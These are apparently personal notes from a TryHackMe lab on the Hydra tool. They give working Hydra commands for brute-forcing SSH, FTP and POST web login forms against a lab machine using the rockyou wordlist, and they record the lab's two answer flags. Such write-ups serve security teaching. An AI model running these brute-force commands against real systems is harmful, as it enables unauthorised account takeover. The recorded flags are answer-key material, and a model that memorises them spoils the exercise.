Deploy the machine attached to this task, then navigate to [http://MACHINE_IP](http://machine_ip/) _(this machine can take up to 3 minutes to boot)_

## Hydra Commands

The options we pass into Hydra depend on which service (protocol) we’re attacking. For example, if we wanted to brute force FTP with the username being `user` and a password list being `passlist.txt`, we’d use the following command:

`hydra -l user -P passlist.txt ftp://MACHINE_IP`

For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).

### SSH

```
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```

|Option|Description|
|---|---|
|-l |specifies the (SSH) username for login|
|-P |indicates a list of passwords|
|-t |sets the number of threads to spawn|

For example, `hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh` will run with the following arguments:

- Hydra will use `root` as the username for `ssh`
- It will try the passwords in the `passwords.txt` file
- There will be four threads running in parallel as indicated by `-t 4`

### Post Web Form

We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

`sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"`

Example:

Using Burp:

![[Pasted image 20240218233618.png]]

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.130.60 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
```

![[Pasted image 20240218202715.png]]

|Option|Description|
|---|---|
|-l |the username for (web form) login|
|-P |the password list to use|
|http-post-form |the type of the form is POST|
|`<path>`  |the login page URL, for example, `login.php`|
|<login_credentials> |the username and password used to log in, for example, `username=^USER^&password=^PASS^`|
|<invalid_response> |part of the response when the login fails|
|-V |verbose output for every attempt|

Below is a more concrete example Hydra command to brute force a POST login form:

`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

- The login page is only `/`, i.e., the main IP address.
- The `username` is the form field where the username is entered
- The specified username(s) will replace `^USER^`
- The `password` is the form field where the password is entered
- The provided passwords will be replacing `^PASS^`
- Finally, `F=incorrect` is a string that appears in the server reply when the login fails

You should now have enough information to put this to practice and brute force your credentials to the deployed machine!

Answer the questions below

| Question | Answer |
| ---- | ---- |
| Use Hydra to bruteforce molly's web password. What is flag 1? | THM{2673a7dd116de68e85c48ec0b1f2612e} |
|  |  |

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.130.60 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
```

![[Pasted image 20240218203421.png]]


![[Pasted image 20240218203034.png]]

| Question | Answer    |
| -------- | --- |
| Use Hydra to bruteforce molly's SSH password. What is flag 2?         | THM{c8eeb0468febbadea859baeb33b2541b}    |

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.130.60 ssh
```

![[Pasted image 20240218203521.png]]

```
ssh molly@10.10.130.60
```

![[Pasted image 20240218203835.png]]

![[Pasted image 20240218204001.png]]
